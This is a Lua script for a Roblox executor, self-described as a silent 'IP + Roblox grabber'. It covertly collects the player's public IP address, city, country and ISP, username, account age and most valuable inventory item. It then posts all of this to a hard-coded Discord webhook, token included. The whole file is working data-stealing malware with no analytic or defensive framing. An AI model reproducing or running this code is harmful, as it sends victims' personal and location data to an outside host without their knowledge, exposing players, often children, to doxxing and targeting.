-- DELTA EXECUTOR - ADVANCED IP + ROBLOX GRABBER (Silent)
local request = (syn and syn.request) or (http and http.request) or request
if not request then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local name = player.Name
local userId = player.UserId
local accountAge = player.AccountAge .. " days"

-- === GET IP (SAME AS BEFORE) ===
local ip
for _, url in {"http://icanhazip.com", "https://api.ipify.org", "http://ifconfig.me/ip"} do
    local s, r = pcall(request, {Url = url, Method = "GET"})
    if s and r and r.Body then
        ip = r.Body:match("^(%d+%.%d+%.%d+%.%d+)$")
        if ip then break end
    end
end
if not ip then return end

-- === GET IP INFO (SAME) ===
local info = {city="?", country="?", isp="?"}
pcall(function()
    local r = request({Url = "http://ip-api.com/json/"..ip.."?fields=city,country,isp", Method = "GET"})
    if r and r.Body and r.Body:find("{") then
        local d = HttpService:JSONDecode(r.Body)
        if d then info = d end
    end
end)

-- === GET ROBLOX PROFILE INFO ===
local displayName = name
local profileData = {displayName = name, isBanned = false}
pcall(function()
    local r = request({Url = "https://users.roblox.com/v1/users/" .. userId, Method = "GET"})
    if r and r.Body and r.Body:find("{") then
        local d = HttpService:JSONDecode(r.Body)
        if d and d.displayName then
            displayName = d.displayName
            profileData = d
        end
    end
end)

-- === GET MOST EXPENSIVE ITEM (Using Rolimons API - BEST SOURCE) ===
local mostExpensive = {name="None", rap=0, value=0}
pcall(function()
    -- Get player inventory from Rolimons
    local r = request({Url = "https://www.rolimons.com/playerapi/player/" .. userId, Method = "GET"})
    if r and r.Body:find("{") then
        local data = HttpService:JSONDecode(r.Body)
        if data and data.items then
            for _, itemData in pairs(data.items) do
                local rap = itemData.rap or 0
                local value = itemData.value or 0
                local price = math.max(rap, value)
                if price > mostExpensive.rap then
                    mostExpensive = {
                        name = itemData.name,
                        rap = rap,
                        value = value
                    }
                end
            end
        end
    end
end)

-- Fallback: Try Roblox inventory API for gamepasses/limiteds (using roproxy for exploit compat)
pcall(function()
    local r = request({Url = "https://inventory.roproxy.com/v1/users/" .. userId .. "/assets/collectibles?sortOrder=Asc&limit=100", Method = "GET"})
    if r and r.Body:find("{") then
        local data = HttpService:JSONDecode(r.Body)
        if data and data.data then
            for _, asset in pairs(data.data) do
                if asset.recentAveragePrice and asset.recentAveragePrice > mostExpensive.rap then
                    -- Fetch item name if needed (extra request, but fallback)
                    pcall(function()
                        local itemR = request({Url = "https://economy.roproxy.com/v1/assets/" .. asset.id .. "/resale-data", Method = "GET"})
                        if itemR and itemR.Body:find("{") then
                            local itemData = HttpService:JSONDecode(itemR.Body)
                            mostExpensive = {
                                name = "Limited Item #" .. asset.id,  -- Fallback name
                                rap = asset.recentAveragePrice
                            }
                        end
                    end)
                end
            end
        end
    end
end)

-- === PROFILE THUMBNAIL + LINK ===
local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
local profileUrl = string.format("https://www.roblox.com/users/%d/profile", userId)

-- === BUILD DISCORD EMBED (RICH FORMAT) ===
local embeds = {{
    title = string.format("%s (%s)", displayName, name),
    description = string.format(
        "**Account Age:** %s\n**Most Expensive Item:** %s (RAP: %s | Value: %s)\n**IP:** `%s`\n**Location:** %s, %s\n**ISP:** %s",
        accountAge,
        mostExpensive.name,
        mostExpensive.rap > 0 and tostring(mostExpensive.rap) or "N/A",
        mostExpensive.value > 0 and tostring(mostExpensive.value) or "N/A",
        ip, info.city, info.country, info.isp
    ),
    url = profileUrl,
    type = "rich",
    thumbnail = {
        url = avatarUrl
    },
    color = 3447003,  -- Blue color
    footer = {
        text = "Profile: " .. profileUrl
    }
}}

local payload = {
    username = "Roblox Logger",
    avatar_url = avatarUrl,
    embeds = embeds
}

-- === SEND TO WEBHOOK ===
local webhook = "https://discord.com/api/webhooks/1436898097765548032/NhpnCBD_N1jYTSCHSEKRVjTn2IeGfMeJkFTQAqeKzKAmdMjugeOkuUiJjKquwYS_79QY"
pcall(function()
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)
